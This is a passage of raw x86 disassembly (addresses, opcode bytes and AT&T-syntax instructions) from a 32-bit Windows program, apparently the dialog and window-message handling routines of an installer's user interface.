  4041f9:	a1 a4 a2 42 00       	mov    0x42a2a4,%eax
  4041fe:	39 05 9c a3 40 00    	cmp    %eax,0x40a39c
  404204:	0f 83 13 02 00 00    	jae    0x40441d
  40420a:	ff 76 24             	push   0x24(%esi)
  40420d:	8b 5e 14             	mov    0x14(%esi),%ebx
  404210:	68 00 a0 43 00       	push   $0x43a000
  404215:	e8 5f 23 00 00       	call   0x406579
  40421a:	ff 76 20             	push   0x20(%esi)
  40421d:	68 19 fc ff ff       	push   $0xfffffc19
  404222:	57                   	push   %edi
  404223:	e8 6a 02 00 00       	call   0x404492
  404228:	ff 76 1c             	push   0x1c(%esi)
  40422b:	68 1b fc ff ff       	push   $0xfffffc1b
  404230:	57                   	push   %edi
  404231:	e8 5c 02 00 00       	call   0x404492
  404236:	ff 76 28             	push   0x28(%esi)
  404239:	68 1a fc ff ff       	push   $0xfffffc1a
  40423e:	57                   	push   %edi
  40423f:	e8 4e 02 00 00       	call   0x404492
  404244:	6a 03                	push   $0x3
  404246:	57                   	push   %edi
  404247:	ff 15 64 82 40 00    	call   *0x408264
  40424d:	39 2d 0c a3 42 00    	cmp    %ebp,0x42a30c
  404253:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  404257:	74 08                	je     0x404261
  404259:	66 81 e3 fd fe       	and    $0xfefd,%bx
  40425e:	83 cb 04             	or     $0x4,%ebx
  404261:	8b cb                	mov    %ebx,%ecx
  404263:	83 e1 08             	and    $0x8,%ecx
  404266:	51                   	push   %ecx
  404267:	50                   	push   %eax
  404268:	ff 15 50 82 40 00    	call   *0x408250
  40426e:	8b c3                	mov    %ebx,%eax
  404270:	25 00 01 00 00       	and    $0x100,%eax
  404275:	50                   	push   %eax
  404276:	ff 74 24 30          	push   0x30(%esp)
  40427a:	ff 15 78 82 40 00    	call   *0x408278
  404280:	8b c3                	mov    %ebx,%eax
  404282:	83 e0 02             	and    $0x2,%eax
  404285:	50                   	push   %eax
  404286:	e8 29 02 00 00       	call   0x4044b4
  40428b:	83 e3 04             	and    $0x4,%ebx
  40428e:	53                   	push   %ebx
  40428f:	ff 35 10 17 42 00    	push   0x421710
  404295:	ff 15 78 82 40 00    	call   *0x408278
  40429b:	3b dd                	cmp    %ebp,%ebx
  40429d:	74 03                	je     0x4042a2
  40429f:	55                   	push   %ebp
  4042a0:	eb 02                	jmp    0x4042a4
  4042a2:	6a 01                	push   $0x1
  4042a4:	68 60 f0 00 00       	push   $0xf060
  4042a9:	55                   	push   %ebp
  4042aa:	57                   	push   %edi
  4042ab:	ff 15 08 82 40 00    	call   *0x408208
  4042b1:	50                   	push   %eax
  4042b2:	ff 15 0c 82 40 00    	call   *0x40820c
  4042b8:	8b 1d 80 82 40 00    	mov    0x408280,%ebx
  4042be:	6a 01                	push   $0x1
  4042c0:	55                   	push   %ebp
  4042c1:	68 f4 00 00 00       	push   $0xf4
  4042c6:	ff 74 24 38          	push   0x38(%esp)
  4042ca:	ff d3                	call   *%ebx
  4042cc:	39 2d 0c a3 42 00    	cmp    %ebp,0x42a30c
  4042d2:	74 13                	je     0x4042e7
  4042d4:	55                   	push   %ebp
  4042d5:	6a 02                	push   $0x2
  4042d7:	68 01 04 00 00       	push   $0x401
  4042dc:	57                   	push   %edi
  4042dd:	ff d3                	call   *%ebx
  4042df:	ff 35 10 17 42 00    	push   0x421710
  4042e5:	eb 06                	jmp    0x4042ed
  4042e7:	ff 35 44 37 42 00    	push   0x423744
  4042ed:	e8 d5 01 00 00       	call   0x4044c7
  4042f2:	e8 a3 fc ff ff       	call   0x403f9a
  4042f7:	bb 48 37 42 00       	mov    $0x423748,%ebx
  4042fc:	50                   	push   %eax
  4042fd:	53                   	push   %ebx
  4042fe:	e8 39 22 00 00       	call   0x40653c
  404303:	ff 76 18             	push   0x18(%esi)
  404306:	53                   	push   %ebx
  404307:	e8 46 22 00 00       	call   0x406552
  40430c:	8d 04 45 48 37 42 00 	lea    0x423748(,%eax,2),%eax
  404313:	50                   	push   %eax
  404314:	e8 60 22 00 00       	call   0x406579
  404319:	53                   	push   %ebx
  40431a:	57                   	push   %edi
  40431b:	ff 15 44 82 40 00    	call   *0x408244
  404321:	55                   	push   %ebp
  404322:	ff 76 08             	push   0x8(%esi)
  404325:	e8 5f d0 ff ff       	call   0x401389
  40432a:	85 c0                	test   %eax,%eax
  40432c:	0f 85 97 fe ff ff    	jne    0x4041c9
  404332:	39 2e                	cmp    %ebp,(%esi)
  404334:	0f 84 8f fe ff ff    	je     0x4041c9
  40433a:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  40433e:	75 1d                	jne    0x40435d
  404340:	39 2d 0c a3 42 00    	cmp    %ebp,0x42a30c
  404346:	0f 85 13 01 00 00    	jne    0x40445f
  40434c:	39 2d 00 a3 42 00    	cmp    %ebp,0x42a300
  404352:	0f 85 71 fe ff ff    	jne    0x4041c9
  404358:	e9 02 01 00 00       	jmp    0x40445f
  40435d:	ff 35 38 92 42 00    	push   0x429238
  404363:	ff 15 38 82 40 00    	call   *0x408238
  404369:	89 35 20 27 42 00    	mov    %esi,0x422720
  40436f:	39 2e                	cmp    %ebp,(%esi)
  404371:	0f 8e c5 00 00 00    	jle    0x40443c
  404377:	8b 46 04             	mov    0x4(%esi),%eax
  40437a:	56                   	push   %esi
  40437b:	ff 34 85 a0 a3 40 00 	push   0x40a3a0(,%eax,4)
  404382:	66 8b 06             	mov    (%esi),%ax
  404385:	66 03 05 40 92 42 00 	add    0x429240,%ax
  40438c:	57                   	push   %edi
  40438d:	0f b7 c0             	movzwl %ax,%eax
  404390:	50                   	push   %eax
  404391:	ff 35 60 a2 42 00    	push   0x42a260
  404397:	ff 15 3c 82 40 00    	call   *0x40823c
  40439d:	3b c5                	cmp    %ebp,%eax
  40439f:	a3 38 92 42 00       	mov    %eax,0x429238
  4043a4:	0f 84 92 00 00 00    	je     0x40443c
  4043aa:	ff 76 2c             	push   0x2c(%esi)
  4043ad:	6a 06                	push   $0x6
  4043af:	50                   	push   %eax
  4043b0:	e8 dd 00 00 00       	call   0x404492
  4043b5:	8d 44 24 10          	lea    0x10(%esp),%eax
  4043b9:	50                   	push   %eax
  4043ba:	68 fa 03 00 00       	push   $0x3fa
  4043bf:	57                   	push   %edi
  4043c0:	ff 15 64 82 40 00    	call   *0x408264
  4043c6:	50                   	push   %eax
  4043c7:	ff 15 10 82 40 00    	call   *0x408210
  4043cd:	8d 44 24 10          	lea    0x10(%esp),%eax
  4043d1:	50                   	push   %eax
  4043d2:	57                   	push   %edi
  4043d3:	ff 15 14 82 40 00    	call   *0x408214
  4043d9:	6a 15                	push   $0x15
  4043db:	55                   	push   %ebp
  4043dc:	55                   	push   %ebp
  4043dd:	ff 74 24 20          	push   0x20(%esp)
  4043e1:	ff 74 24 20          	push   0x20(%esp)
  4043e5:	55                   	push   %ebp
  4043e6:	ff 35 38 92 42 00    	push   0x429238
  4043ec:	ff 15 fc 81 40 00    	call   *0x4081fc
  4043f2:	55                   	push   %ebp
  4043f3:	ff 76 0c             	push   0xc(%esi)
  4043f6:	e8 8e cf ff ff       	call   0x401389
  4043fb:	39 2d 2c 92 42 00    	cmp    %ebp,0x42922c
  404401:	75 5c                	jne    0x40445f
  404403:	6a 08                	push   $0x8
  404405:	ff 35 38 92 42 00    	push   0x429238
  40440b:	ff 15 50 82 40 00    	call   *0x408250
  404411:	68 05 04 00 00       	push   $0x405
  404416:	e8 c3 00 00 00       	call   0x4044de
  40441b:	eb 1f                	jmp    0x40443c
  40441d:	ff 35 38 92 42 00    	push   0x429238
  404423:	ff 15 38 82 40 00    	call   *0x408238
  404429:	ff 35 18 1f 42 00    	push   0x421f18
  40442f:	89 2d 68 a2 42 00    	mov    %ebp,0x42a268
  404435:	57                   	push   %edi
  404436:	ff 15 18 82 40 00    	call   *0x408218
  40443c:	39 2d 48 57 42 00    	cmp    %ebp,0x425748
  404442:	75 1b                	jne    0x40445f
  404444:	39 2d 38 92 42 00    	cmp    %ebp,0x429238
  40444a:	74 13                	je     0x40445f
  40444c:	6a 0a                	push   $0xa
  40444e:	57                   	push   %edi
  40444f:	ff 15 50 82 40 00    	call   *0x408250
  404455:	c7 05 48 57 42 00 01 	movl   $0x1,0x425748
  40445c:	00 00 00 
  40445f:	33 c0                	xor    %eax,%eax
  404461:	5f                   	pop    %edi
  404462:	5e                   	pop    %esi
  404463:	5d                   	pop    %ebp
  404464:	5b                   	pop    %ebx
  404465:	83 c4 10             	add    $0x10,%esp
  404468:	c2 10 00             	ret    $0x10
  40446b:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  404470:	75 06                	jne    0x404478
  404472:	ff 05 2c 92 42 00    	incl   0x42922c
  404478:	6a 00                	push   $0x0
  40447a:	ff 74 24 08          	push   0x8(%esp)
  40447e:	68 08 04 00 00       	push   $0x408
  404483:	ff 35 68 a2 42 00    	push   0x42a268
  404489:	ff 15 80 82 40 00    	call   *0x408280
  40448f:	c2 04 00             	ret    $0x4
  404492:	ff 74 24 0c          	push   0xc(%esp)
  404496:	6a 00                	push   $0x0
  404498:	e8 dc 20 00 00       	call   0x406579
  40449d:	50                   	push   %eax
  40449e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4044a2:	05 e8 03 00 00       	add    $0x3e8,%eax
  4044a7:	50                   	push   %eax
  4044a8:	ff 74 24 0c          	push   0xc(%esp)
  4044ac:	e8 cf 16 00 00       	call   0x405b80
  4044b1:	c2 0c 00             	ret    $0xc
  4044b4:	ff 74 24 04          	push   0x4(%esp)
  4044b8:	ff 35 44 37 42 00    	push   0x423744
  4044be:	ff 15 78 82 40 00    	call   *0x408278
  4044c4:	c2 04 00             	ret    $0x4
  4044c7:	6a 01                	push   $0x1
  4044c9:	ff 74 24 08          	push   0x8(%esp)
  4044cd:	6a 28                	push   $0x28
  4044cf:	ff 35 68 a2 42 00    	push   0x42a268
  4044d5:	ff 15 80 82 40 00    	call   *0x408280
  4044db:	c2 04 00             	ret    $0x4
  4044de:	a1 38 92 42 00       	mov    0x429238,%eax
  4044e3:	85 c0                	test   %eax,%eax
  4044e5:	74 0f                	je     0x4044f6
  4044e7:	6a 00                	push   $0x0
  4044e9:	6a 00                	push   $0x0
  4044eb:	ff 74 24 0c          	push   0xc(%esp)
  4044ef:	50                   	push   %eax
  4044f0:	ff 15 80 82 40 00    	call   *0x408280
  4044f6:	c2 04 00             	ret    $0x4
  4044f9:	55                   	push   %ebp
  4044fa:	8b ec                	mov    %esp,%ebp
  4044fc:	83 ec 0c             	sub    $0xc,%esp
  4044ff:	8b 45 08             	mov    0x8(%ebp),%eax
  404502:	56                   	push   %esi
  404503:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  404508:	83 f8 05             	cmp    $0x5,%eax
  40450b:	0f 87 b0 00 00 00    	ja     0x4045c1
  404511:	6a eb                	push   $0xffffffeb
  404513:	ff 75 10             	push   0x10(%ebp)
  404516:	ff 15 f4 81 40 00    	call   *0x4081f4
  40451c:	8b f0                	mov    %eax,%esi
  40451e:	85 f6                	test   %esi,%esi
  404520:	0f 84 9b 00 00 00    	je     0x4045c1
  404526:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  40452a:	0f 87 91 00 00 00    	ja     0x4045c1
  404530:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  404534:	0f 87 87 00 00 00    	ja     0x4045c1
  40453a:	8b 4e 14             	mov    0x14(%esi),%ecx
  40453d:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  404543:	75 7c                	jne    0x4045c1
  404545:	8b 06                	mov    (%esi),%eax
  404547:	57                   	push   %edi
  404548:	8b 3d f8 81 40 00    	mov    0x4081f8,%edi
  40454e:	f6 c1 02             	test   $0x2,%cl
  404551:	74 03                	je     0x404556
  404553:	50                   	push   %eax
  404554:	ff d7                	call   *%edi
  404556:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  40455a:	74 0a                	je     0x404566
  40455c:	50                   	push   %eax
  40455d:	ff 75 0c             	push   0xc(%ebp)
  404560:	ff 15 64 80 40 00    	call   *0x408064
  404566:	ff 76 10             	push   0x10(%esi)
  404569:	ff 75 0c             	push   0xc(%ebp)
  40456c:	ff 15 4c 80 40 00    	call   *0x40804c
  404572:	8b 46 04             	mov    0x4(%esi),%eax
  404575:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  404579:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40457c:	74 06                	je     0x404584
  40457e:	50                   	push   %eax
  40457f:	ff d7                	call   *%edi
  404581:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404584:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  404588:	5f                   	pop    %edi
  404589:	74 0a                	je     0x404595
  40458b:	50                   	push   %eax
  40458c:	ff 75 0c             	push   0xc(%ebp)
  40458f:	ff 15 50 80 40 00    	call   *0x408050
  404595:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  404599:	74 21                	je     0x4045bc
  40459b:	8b 46 08             	mov    0x8(%esi),%eax
  40459e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4045a1:	8b 46 0c             	mov    0xc(%esi),%eax
  4045a4:	85 c0                	test   %eax,%eax
  4045a6:	74 07                	je     0x4045af
  4045a8:	50                   	push   %eax
  4045a9:	ff 15 60 80 40 00    	call   *0x408060
  4045af:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4045b2:	50                   	push   %eax
  4045b3:	ff 15 5c 80 40 00    	call   *0x40805c
  4045b9:	89 46 0c             	mov    %eax,0xc(%esi)
  4045bc:	8b 46 0c             	mov    0xc(%esi),%eax
  4045bf:	eb 02                	jmp    0x4045c3
  4045c1:	33 c0                	xor    %eax,%eax
  4045c3:	5e                   	pop    %esi
  4045c4:	c9                   	leave
  4045c5:	c2 0c 00             	ret    $0xc
  4045c8:	55                   	push   %ebp
  4045c9:	8b ec                	mov    %esp,%ebp
  4045cb:	8b 45 10             	mov    0x10(%ebp),%eax
  4045ce:	8b 0d 14 17 42 00    	mov    0x421714,%ecx
  4045d4:	d1 e8                	shr    $1,%eax
  4045d6:	50                   	push   %eax
  4045d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4045da:	03 c8                	add    %eax,%ecx
  4045dc:	51                   	push   %ecx
  4045dd:	ff 75 0c             	push   0xc(%ebp)
  4045e0:	ff 15 c0 80 40 00    	call   *0x4080c0
  4045e6:	ff 75 0c             	push   0xc(%ebp)
  4045e9:	ff 15 c4 80 40 00    	call   *0x4080c4
  4045ef:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4045f2:	03 c0                	add    %eax,%eax
  4045f4:	89 01                	mov    %eax,(%ecx)
  4045f6:	01 05 14 17 42 00    	add    %eax,0x421714
  4045fc:	33 c0                	xor    %eax,%eax
  4045fe:	5d                   	pop    %ebp
  4045ff:	c2 10 00             	ret    $0x10
  404602:	55                   	push   %ebp
  404603:	8b ec                	mov    %esp,%ebp
  404605:	a1 14 17 42 00       	mov    0x421714,%eax
  40460a:	56                   	push   %esi
  40460b:	8b 75 08             	mov    0x8(%ebp),%esi
  40460e:	8d 04 46             	lea    (%esi,%eax,2),%eax
  404611:	50                   	push   %eax
  404612:	ff 15 c4 80 40 00    	call   *0x4080c4
  404618:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40461b:	d1 e9                	shr    $1,%ecx
  40461d:	3b c1                	cmp    %ecx,%eax
  40461f:	72 02                	jb     0x404623
  404621:	8b c1                	mov    %ecx,%eax
  404623:	33 c9                	xor    %ecx,%ecx
  404625:	51                   	push   %ecx
  404626:	51                   	push   %ecx
  404627:	ff 75 10             	push   0x10(%ebp)
  40462a:	ff 75 0c             	push   0xc(%ebp)
  40462d:	50                   	push   %eax
  40462e:	a1 14 17 42 00       	mov    0x421714,%eax
  404633:	8d 04 46             	lea    (%esi,%eax,2),%eax
  404636:	50                   	push   %eax
  404637:	51                   	push   %ecx
  404638:	51                   	push   %ecx
  404639:	ff 15 bc 80 40 00    	call   *0x4080bc
  40463f:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404642:	5e                   	pop    %esi
  404643:	89 01                	mov    %eax,(%ecx)
  404645:	01 05 14 17 42 00    	add    %eax,0x421714
  40464b:	33 c0                	xor    %eax,%eax
  40464d:	5d                   	pop    %ebp
  40464e:	c2 10 00             	ret    $0x10
  404651:	55                   	push   %ebp
  404652:	8b ec                	mov    %esp,%ebp
  404654:	83 ec 0c             	sub    $0xc,%esp
  404657:	53                   	push   %ebx
  404658:	33 db                	xor    %ebx,%ebx
  40465a:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404661:	56                   	push   %esi
  404662:	57                   	push   %edi
  404663:	0f 85 1a 01 00 00    	jne    0x404783
  404669:	8b 7d 14             	mov    0x14(%ebp),%edi
  40466c:	8b 47 30             	mov    0x30(%edi),%eax
  40466f:	3b c3                	cmp    %ebx,%eax
  404671:	7d 11                	jge    0x404684
  404673:	8b 0d 3c 92 42 00    	mov    0x42923c,%ecx
  404679:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  404680:	2b c8                	sub    %eax,%ecx
  404682:	8b 01                	mov    (%ecx),%eax
  404684:	8b 0d b8 a2 42 00    	mov    0x42a2b8,%ecx
  40468a:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  40468d:	0f b7 08             	movzwl (%eax),%ecx
  404690:	40                   	inc    %eax
  404691:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404694:	40                   	inc    %eax
  404695:	83 f9 02             	cmp    $0x2,%ecx
  404698:	89 45 14             	mov    %eax,0x14(%ebp)
  40469b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40469e:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4046a1:	c7 45 fc 02 46 40 00 	movl   $0x404602,-0x4(%ebp)
  4046a8:	74 07                	je     0x4046b1
  4046aa:	c7 45 fc c8 45 40 00 	movl   $0x4045c8,-0x4(%ebp)
  4046b1:	8b 47 14             	mov    0x14(%edi),%eax
  4046b4:	ff 77 34             	push   0x34(%edi)
  4046b7:	8b f0                	mov    %eax,%esi
  4046b9:	83 e0 01             	and    $0x1,%eax
  4046bc:	f7 d6                	not    %esi
  4046be:	c1 ee 05             	shr    $0x5,%esi
  4046c1:	6a 22                	push   $0x22
  4046c3:	83 e6 01             	and    $0x1,%esi
  4046c6:	ff 75 08             	push   0x8(%ebp)
  4046c9:	0b f0                	or     %eax,%esi
  4046cb:	e8 c2 fd ff ff       	call   0x404492
  4046d0:	ff 77 38             	push   0x38(%edi)
  4046d3:	6a 23                	push   $0x23
  4046d5:	ff 75 08             	push   0x8(%ebp)
  4046d8:	e8 b5 fd ff ff       	call   0x404492
  4046dd:	33 c0                	xor    %eax,%eax
  4046df:	3b f3                	cmp    %ebx,%esi
  4046e1:	0f 94 c0             	sete   %al
  4046e4:	05 0a 04 00 00       	add    $0x40a,%eax
  4046e9:	6a 01                	push   $0x1
  4046eb:	50                   	push   %eax
  4046ec:	ff 75 08             	push   0x8(%ebp)
  4046ef:	ff 15 e8 81 40 00    	call   *0x4081e8
  4046f5:	56                   	push   %esi
  4046f6:	e8 b9 fd ff ff       	call   0x4044b4
  4046fb:	68 e8 03 00 00       	push   $0x3e8
  404700:	ff 75 08             	push   0x8(%ebp)
  404703:	ff 15 64 82 40 00    	call   *0x408264
  404709:	8b f8                	mov    %eax,%edi
  40470b:	57                   	push   %edi
  40470c:	e8 b6 fd ff ff       	call   0x4044c7
  404711:	8b 35 80 82 40 00    	mov    0x408280,%esi
  404717:	53                   	push   %ebx
  404718:	6a 01                	push   $0x1
  40471a:	68 5b 04 00 00       	push   $0x45b
  40471f:	57                   	push   %edi
  404720:	ff d6                	call   *%esi
  404722:	a1 74 a2 42 00       	mov    0x42a274,%eax
  404727:	8b 40 68             	mov    0x68(%eax),%eax
  40472a:	3b c3                	cmp    %ebx,%eax
  40472c:	7d 09                	jge    0x404737
  40472e:	f7 d8                	neg    %eax
  404730:	50                   	push   %eax
  404731:	ff 15 f8 81 40 00    	call   *0x4081f8
  404737:	50                   	push   %eax
  404738:	53                   	push   %ebx
  404739:	68 43 04 00 00       	push   $0x443
  40473e:	57                   	push   %edi
  40473f:	ff d6                	call   *%esi
  404741:	68 00 00 01 04       	push   $0x4010000
  404746:	53                   	push   %ebx
  404747:	68 45 04 00 00       	push   $0x445
  40474c:	57                   	push   %edi
  40474d:	ff d6                	call   *%esi
  40474f:	ff 75 14             	push   0x14(%ebp)
  404752:	e8 fb 1d 00 00       	call   0x406552
  404757:	50                   	push   %eax
  404758:	53                   	push   %ebx
  404759:	68 35 04 00 00       	push   $0x435
  40475e:	57                   	push   %edi
  40475f:	ff d6                	call   *%esi
  404761:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404764:	89 1d 14 17 42 00    	mov    %ebx,0x421714
  40476a:	50                   	push   %eax
  40476b:	ff 75 0c             	push   0xc(%ebp)
  40476e:	68 49 04 00 00       	push   $0x449
  404773:	57                   	push   %edi
  404774:	ff d6                	call   *%esi
  404776:	89 1d 14 17 42 00    	mov    %ebx,0x421714
  40477c:	33 c0                	xor    %eax,%eax
  40477e:	e9 52 01 00 00       	jmp    0x4048d5
  404783:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40478a:	8b 35 80 82 40 00    	mov    0x408280,%esi
  404790:	75 5b                	jne    0x4047ed
  404792:	8b 45 10             	mov    0x10(%ebp),%eax
  404795:	c1 e8 10             	shr    $0x10,%eax
  404798:	66 85 c0             	test   %ax,%ax
  40479b:	0f 85 25 01 00 00    	jne    0x4048c6
  4047a1:	39 1d 14 17 42 00    	cmp    %ebx,0x421714
  4047a7:	0f 85 19 01 00 00    	jne    0x4048c6
  4047ad:	a1 20 27 42 00       	mov    0x422720,%eax
  4047b2:	8d 78 14             	lea    0x14(%eax),%edi
  4047b5:	f6 07 20             	testb  $0x20,(%edi)
  4047b8:	0f 84 08 01 00 00    	je     0x4048c6
  4047be:	53                   	push   %ebx
  4047bf:	53                   	push   %ebx
  4047c0:	68 f0 00 00 00       	push   $0xf0
  4047c5:	68 0a 04 00 00       	push   $0x40a
  4047ca:	ff 75 08             	push   0x8(%ebp)
  4047cd:	ff 15 64 82 40 00    	call   *0x408264
  4047d3:	50                   	push   %eax
  4047d4:	ff d6                	call   *%esi
  4047d6:	8b 0f                	mov    (%edi),%ecx
  4047d8:	83 e0 01             	and    $0x1,%eax
  4047db:	83 e1 fe             	and    $0xfffffffe,%ecx
  4047de:	50                   	push   %eax
  4047df:	0b c8                	or     %eax,%ecx
  4047e1:	89 0f                	mov    %ecx,(%edi)
  4047e3:	e8 cc fc ff ff       	call   0x4044b4
  4047e8:	e8 ef 00 00 00       	call   0x4048dc
  4047ed:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  4047f1:	0f 85 c0 00 00 00    	jne    0x4048b7
  4047f7:	68 e8 03 00 00       	push   $0x3e8
  4047fc:	ff 75 08             	push   0x8(%ebp)
  4047ff:	ff 15 64 82 40 00    	call   *0x408264
  404805:	8b 7d 14             	mov    0x14(%ebp),%edi
  404808:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  40480f:	75 67                	jne    0x404878
  404811:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  404818:	75 5e                	jne    0x404878
  40481a:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  40481d:	8b 57 18             	mov    0x18(%edi),%edx
  404820:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404823:	2b ca                	sub    %edx,%ecx
  404825:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  40482b:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40482e:	c7 45 fc 00 82 42 00 	movl   $0x428200,-0x4(%ebp)
  404835:	73 41                	jae    0x404878
  404837:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40483a:	51                   	push   %ecx
  40483b:	53                   	push   %ebx
  40483c:	68 4b 04 00 00       	push   $0x44b
  404841:	50                   	push   %eax
  404842:	ff d6                	call   *%esi
  404844:	8b 3d ec 81 40 00    	mov    0x4081ec,%edi
  40484a:	68 02 7f 00 00       	push   $0x7f02
  40484f:	53                   	push   %ebx
  404850:	ff d7                	call   *%edi
  404852:	50                   	push   %eax
  404853:	ff 15 f0 81 40 00    	call   *0x4081f0
  404859:	6a 01                	push   $0x1
  40485b:	ff 75 fc             	push   -0x4(%ebp)
  40485e:	ff 75 08             	push   0x8(%ebp)
  404861:	e8 9a 00 00 00       	call   0x404900
  404866:	68 00 7f 00 00       	push   $0x7f00
  40486b:	53                   	push   %ebx
  40486c:	ff d7                	call   *%edi
  40486e:	50                   	push   %eax
  40486f:	ff 15 f0 81 40 00    	call   *0x4081f0
  404875:	8b 7d 14             	mov    0x14(%ebp),%edi
  404878:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  40487f:	75 48                	jne    0x4048c9
  404881:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  404888:	75 3f                	jne    0x4048c9
  40488a:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  40488e:	75 10                	jne    0x4048a0
  404890:	53                   	push   %ebx
  404891:	6a 01                	push   $0x1
  404893:	68 11 01 00 00       	push   $0x111
  404898:	ff 35 68 a2 42 00    	push   0x42a268
  40489e:	ff d6                	call   *%esi
  4048a0:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  4048a4:	75 0c                	jne    0x4048b2
  4048a6:	53                   	push   %ebx
  4048a7:	53                   	push   %ebx
  4048a8:	6a 10                	push   $0x10
  4048aa:	ff 35 68 a2 42 00    	push   0x42a268
  4048b0:	ff d6                	call   *%esi
  4048b2:	33 c0                	xor    %eax,%eax
  4048b4:	40                   	inc    %eax
  4048b5:	eb 1e                	jmp    0x4048d5
  4048b7:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4048be:	75 06                	jne    0x4048c6
  4048c0:	ff 05 14 17 42 00    	incl   0x421714
  4048c6:	8b 7d 14             	mov    0x14(%ebp),%edi
  4048c9:	57                   	push   %edi
  4048ca:	ff 75 10             	push   0x10(%ebp)
  4048cd:	ff 75 0c             	push   0xc(%ebp)
  4048d0:	e8 24 fc ff ff       	call   0x4044f9
  4048d5:	5f                   	pop    %edi
  4048d6:	5e                   	pop    %esi
  4048d7:	5b                   	pop    %ebx
  4048d8:	c9                   	leave
  4048d9:	c2 10 00             	ret    $0x10
  4048dc:	83 3d 0c a3 42 00 00 	cmpl   $0x0,0x42a30c
  4048e3:	a1 10 17 42 00       	mov    0x421710,%eax
  4048e8:	75 05                	jne    0x4048ef
  4048ea:	a1 44 37 42 00       	mov    0x423744,%eax
  4048ef:	6a 01                	push   $0x1
  4048f1:	6a 01                	push   $0x1
  4048f3:	68 f4 00 00 00       	push   $0xf4
  4048f8:	50                   	push   %eax
  4048f9:	ff 15 80 82 40 00    	call   *0x408280
  4048ff:	c3                   	ret
  404900:	55                   	push   %ebp
  404901:	8b ec                	mov    %esp,%ebp
  404903:	83 ec 3c             	sub    $0x3c,%esp
  404906:	8b 45 08             	mov    0x8(%ebp),%eax
  404909:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  40490d:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  404911:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404914:	8b 45 0c             	mov    0xc(%ebp),%eax
  404917:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  40491e:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404921:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404924:	50                   	push   %eax
  404925:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  40492c:	c7 45 d0 c8 a3 40 00 	movl   $0x40a3c8,-0x30(%ebp)
  404933:	e8 30 12 00 00       	call   0x405b68
  404938:	c9                   	leave
  404939:	c2 0c 00             	ret    $0xc
  40493c:	55                   	push   %ebp
  40493d:	8b ec                	mov    %esp,%ebp
  40493f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404946:	56                   	push   %esi
  404947:	8b 75 14             	mov    0x14(%ebp),%esi
  40494a:	75 26                	jne    0x404972
  40494c:	ff 76 30             	push   0x30(%esi)
  40494f:	6a 1d                	push   $0x1d
  404951:	ff 75 08             	push   0x8(%ebp)
  404954:	e8 39 fb ff ff       	call   0x404492
  404959:	8b 46 3c             	mov    0x3c(%esi),%eax
  40495c:	c1 e0 0b             	shl    $0xb,%eax
  40495f:	05 00 b0 42 00       	add    $0x42b000,%eax
  404964:	50                   	push   %eax
  404965:	68 e8 03 00 00       	push   $0x3e8
  40496a:	ff 75 08             	push   0x8(%ebp)
  40496d:	e8 0e 12 00 00       	call   0x405b80
  404972:	56                   	push   %esi
  404973:	ff 75 10             	push   0x10(%ebp)
  404976:	ff 75 0c             	push   0xc(%ebp)
  404979:	e8 7b fb ff ff       	call   0x4044f9
  40497e:	5e                   	pop    %esi
  40497f:	5d                   	pop    %ebp
  404980:	c2 10 00             	ret    $0x10
  404983:	55                   	push   %ebp
  404984:	8b ec                	mov    %esp,%ebp
  404986:	83 ec 4c             	sub    $0x4c,%esp
  404989:	a1 20 27 42 00       	mov    0x422720,%eax
  40498e:	53                   	push   %ebx
  40498f:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404992:	56                   	push   %esi
  404993:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404996:	8b 40 38             	mov    0x38(%eax),%eax
  404999:	c1 e3 0b             	shl    $0xb,%ebx
  40499c:	81 c3 00 b0 42 00    	add    $0x42b000,%ebx
